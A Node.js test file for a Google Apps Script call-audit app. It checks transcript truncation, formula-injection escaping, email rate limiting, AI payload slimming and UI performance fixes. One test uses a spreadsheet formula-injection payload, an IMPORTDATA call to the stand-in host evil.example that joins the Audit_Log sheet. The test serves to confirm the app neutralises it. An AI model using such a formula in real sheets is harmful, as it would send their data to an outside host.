/**
 * Second app-wide review: input safety, the write path and scale.
 *
 *  1. A long call made the transcript row throw (a Sheets cell holds 50,000 characters; the AI takes 150,000) and the whole submit failed.
 *  2. getAIAnalytics wrote the analysisType it was sent into the AI_Analytics sheet with a plain appendRow: a text that starts with = ran as a formula.
 *  3. sendAnalyticsBriefing sent from the owner's mailbox with no hourly limit.
 *  4. The AI got whole rows (about 35 fields, long texts) when it reads ten; the text it is given must not change.
 *  5. The SAP ID box redrew everything on every key.
 *  6. Every click in a filter list searched the whole store once per item (about 1,725 x 1,725 for Audit Ref).
 *
 * Usage: node tests/review-round2-test.js
 */
const vm = require('vm');
const { load } = require('./lib/page-harness');
const { read, extractFunction, makeCheck } = require('./lib/gas-fakes');
const check = makeCheck();
const code = read('Code.gs');

console.log('\nTest 1 — a long transcript is cut to fit a cell, the short one is not touched');
{
  const ctx = vm.createContext({});
  const limit = Number((/function _cellSafeTranscript_[\s\S]*?var max = (\d+);/.exec(code) || [])[1]);   // the real value, not a copy
  check('the limit in Code.gs is under the 50,000 characters of a cell, with a margin for the note', limit > 0 && limit <= 49500, String(limit));
  vm.runInContext(extractFunction(code, '_cellSafeTranscript_'), ctx);
  const short = 'agent: hello\ncustomer: hi';
  check('a short call is kept exactly', ctx._cellSafeTranscript_(short) === short);
  check('a call of exactly the limit is kept', ctx._cellSafeTranscript_('x'.repeat(49000)).length === 49000);
  const cut = ctx._cellSafeTranscript_('Transcript Duration: 63:10\n' + 'y'.repeat(150000));
  check('150,000 characters become 49,000 or fewer (a cell holds 50,000)', cut.length <= 49000, String(cut.length));
  check('the cut copy keeps the start (the Duration line is read from it)', cut.indexOf('Transcript Duration: 63:10') === 0);
  check('the cut copy says it was cut and how long the call was', /saved copy cut here: the call text was 150027 characters/.test(cut), cut.slice(-120));
  check('null and undefined are an empty text, not the word null', ctx._cellSafeTranscript_(null) === '' && ctx._cellSafeTranscript_(undefined) === '');
  check('the transcript row of submitAnalysis uses it (and only the AI gets the whole text)', /analysisLabel, _cellSafeTranscript_\(formData\.transcript\)/.test(code));
}

console.log('\nTest 2 — the analysis type that reaches the AI_Analytics sheet cannot be a formula');
{
  const written = [], cacheArgs = [];
  const sheet = { appendRow: r => written.push(r), getLastRow: () => 1, getRange: () => ({ setFontWeight() { return this; }, setBackground() { return this; }, setFontColor() { return this; }, getValues: () => [] }), setFrozenRows() {}, deleteRow() {} };
  const ctx = vm.createContext({
    Logger: { log() {} }, Utilities: { base64Encode: s => Buffer.from(s).toString('base64') },
    readAnalyticsCache_: () => null, buildAnalyticsContext_: () => 'ctx', callAIForAnalytics_: () => ({ x: 1 }), renderAnalyticsHTML: () => '<p>ok</p>',
    SpreadsheetApp: {}, getOrCreateSpreadsheet: () => ({ getSheetByName: () => sheet, insertSheet: () => sheet }),
  });
  vm.runInContext('var _DURATION_SHAPE = /^\\d{1,3}:[0-5]\\d(:[0-5]\\d)?$/;', ctx);
  vm.runInContext(extractFunction(read('SheetService.gs'), 'appendRow'), ctx);
  vm.runInContext(extractFunction(code, 'getAIAnalytics'), ctx);
  ctx.writeAnalyticsCache_ = (key, html, at, n, atype) => cacheArgs.push(atype);
  const evil = '=IMPORTDATA("https://evil.example/?d="&JOIN(",",Audit_Log!A:Z))';
  const r = ctx.getAIAnalytics([{ a: 1 }], {}, evil);
  check('the call still works', r.success === true, JSON.stringify(r));
  check('the type that is cached is one of the two real ones, never the text that was sent', cacheArgs.length === 1 && cacheArgs[0] === 'repeats', JSON.stringify(cacheArgs));
  ctx.getAIAnalytics([{ a: 1 }], {}, 'sales');
  check('"sales" stays sales', cacheArgs[1] === 'sales', JSON.stringify(cacheArgs));
  // and the write itself goes through the wrapper, so a leading = is text
  check('writeAnalyticsCache_ writes with the safe appendRow wrapper', /appendRow\(sheet, \[key, generatedAt, html, rowCount, atype\]\)/.test(code) && !/sheet\.appendRow\(\[key, generatedAt/.test(code));
  written.length = 0; ctx.appendRow(sheet, ['k', 'now', '<p>', 1, '=EVIL()']);
  check('the wrapper turns =EVIL() into text', written[0][4] === "'=EVIL()", JSON.stringify(written[0]));
}

console.log('\nTest 3 — the briefing email counts against the hourly limit');
{
  let sent = 0, taken = [];
  const mk = allow => vm.createContext({
    Logger: { log() {} }, Session: { getActiveUser: () => ({ getEmail: () => 'Analyst@Telus.com' }) },
    isAllowedBriefingRecipient_: () => true, sanitizeEvalHtml_: s => s, isAdminCaller_: () => false,
    _emailRateTake_: (e, adm) => { taken.push(e); return allow; }, MailApp: { sendEmail: () => { sent++; } },
  });
  [[true, 1], [false, 0]].forEach(([allow, expectSent]) => {
    sent = 0; taken = [];
    const ctx = mk(allow);
    vm.runInContext(extractFunction(code, 'sendAnalyticsBriefing'), ctx);
    const r = ctx.sendAnalyticsBriefing('boss@telus.com', '<p>x</p>', {}, 'sales', 5);
    check(allow ? 'under the limit the briefing is sent' : 'over the limit nothing is sent and the person is told', sent === expectSent && (allow ? r.success === true : (r.success === false && /lot of emails/.test(r.error))), JSON.stringify(r));
    check('the limit is counted for the signed-in person (lower case)', taken[0] === 'analyst@telus.com', String(taken[0]));
  });
}

console.log('\nTest 4 — the AI gets ten fields, and the text it is given does not change');
{
  const h = load();
  const wide = i => { const r = {}; for (let k = 0; k < 35; k++) r['Field ' + k] = 'x'.repeat(300); return Object.assign(r, {
    'Audit Ref': 'NHA-' + i, 'Interaction ID': 'INT-' + i, 'Team Member': i % 2 ? 'Ana Cruz ' : 'Ben Lee', 'RCA Category': 'Agent Controllable', 'Call Driver': 'Billing',
    'RCA Sub-Parameter': 'Verification; Tone', 'Critical Flags': i % 3 ? 'Flag A | Flag B | Flag A' : 'None', 'Repeat Projection %': i % 4 ? '45%' : '0.8', 'Issue Resolved': ['Yes', 'No', 'Partially resolved - x', ''][i % 4],
    'Call Summary': 'S'.repeat(400) + i }); };
  const rows = Array.from({ length: 40 }, (_, i) => wide(i));
  const slim = h.ctx._dbAiRows(rows);
  check('every row keeps exactly the ten fields', slim.every(r => Object.keys(r).length === 10), String(Object.keys(slim[0]).length));
  check('the payload is much smaller (under a tenth)', JSON.stringify(slim).length * 10 < JSON.stringify(rows).length, JSON.stringify(slim).length + ' vs ' + JSON.stringify(rows).length);
  check('the Call Summary is capped at 200 characters', slim.every(r => r['Call Summary'].length <= 200));
  const sctx = vm.createContext({ PropertiesService: { getScriptProperties: () => ({ getProperty: () => null }) } });
  vm.runInContext(read('ScorecardMetrics.gs'), sctx);
  ['dbUniqServer', 'buildAnalyticsContext_'].forEach(n => vm.runInContext(extractFunction(code, n), sctx));
  ['repeats', 'sales', 'overview'].forEach(kind => {
    const a = sctx.buildAnalyticsContext_(rows, { analysisType: kind }, kind), b = sctx.buildAnalyticsContext_(slim, { analysisType: kind }, kind);
    check('the text for the AI is identical with whole rows and with ten fields (' + kind + ')', a === b, a === b ? '' : 'differs');
  });
  const src = read('index.html');
  check('all three calls send the slim rows', /getOverviewHighlightsLowlights\(_dbAiRows\(rows\)/.test(src) && /getOverviewHighlightsLowlights\(_dbAiRows\(_ovFiltered\)/.test(src) && /getAIAnalytics\(_dbAiRows\(rows\)/.test(src));
}

(async () => {
  console.log('\nTest 5 — the SAP ID box waits for a pause in the typing');
  {
    const h = load();
    let n = 0; h.ctx.dbApplyAll = () => { n++; };
    ['1', '12', '123', '1234', '12345'].forEach(() => h.ctx.dbSapInput());
    check('five keys in a row have drawn nothing yet', n === 0);
    await new Promise(r => setTimeout(r, 450));
    check('after the pause it draws once', n === 1, String(n));
    check('the box calls the debounced handler, not dbApplyAll on every key', /id="sh-sap-search"[^>]*oninput="dbSapInput\(\)"/.test(read('index.html')));
  }

  console.log('\nTest 6 — a click in a filter list does not search the store once per item');
  {
    const h = load();
    h.ctx.dbUpdatePillLabel = () => {}; h.ctx.dbApplyAll = () => {};
    const N = 1725;
    const mkInput = (v, c) => ({ value: v, checked: c });
    const panelInputs = Array.from({ length: N }, (_, i) => mkInput('NHA-' + i, i % 3 === 0));
    const storeInputs = Array.from({ length: N }, (_, i) => mkInput('NHA-' + i, true));
    let searches = 0;
    const panel = h.document.getElementById('panel-ref'), store = h.document.getElementById('sh-ms-ref');
    panel.querySelectorAll = () => panelInputs;
    store.querySelectorAll = () => storeInputs;
    store.querySelector = () => { searches++; return null; };
    h.ctx.dbPillCheck('ref');
    check('the store was not searched item by item', searches === 0, String(searches));
    check('every store box follows its panel box', storeInputs.every((s, i) => s.checked === panelInputs[i].checked));
  }

  console.log(check.state.failures ? '\nFAILED' : '\nALL TESTS PASSED');
  process.exit(check.state.failures ? 1 : 0);
})();
